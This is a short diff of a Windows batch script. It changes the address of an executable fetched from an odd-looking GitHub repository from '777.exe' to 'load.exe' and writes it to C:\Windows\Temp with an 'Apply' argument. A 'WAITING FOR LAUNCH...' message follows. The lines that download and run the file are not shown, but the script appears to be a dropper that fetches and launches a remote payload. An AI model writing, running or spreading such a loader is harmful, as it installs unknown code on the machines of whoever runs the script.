@@ -1,6 +1,6 @@
 @echo off
-set "url=https://github.com/dexterggsamp12/929228282/raw/refs/heads/main/777.exe"
-set "destination=C:\Windows\Temp\777.exe"
+set "url=https://github.com/dexterggsamp12/929228282/raw/refs/heads/main/load.exe"
+set "destination=C:\Windows\Temp\load.exe"
 set "arguments=Apply"
 
 echo WAITING FOR LAUNCH...
